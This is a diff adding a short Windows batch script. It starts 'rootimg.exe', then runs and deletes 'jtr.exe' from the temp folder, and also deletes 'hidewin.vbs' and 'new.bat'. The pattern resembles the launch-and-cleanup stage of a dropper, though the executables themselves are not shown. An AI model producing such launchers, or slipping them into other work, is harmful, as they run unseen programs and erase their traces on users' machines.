@@ -1,0 +1,9 @@
+@echo off
+cd /d %homedrive%\mas
+cd %homedrive%\mas
+start "" "%temp%\rootimg.exe"
+ping localhost -n 4 >nul
+start /wait %temp%\jtr.exe
+del %temp%\jtr.exe
+del %temp%\hidewin.vbs
+del %temp%\new.bat
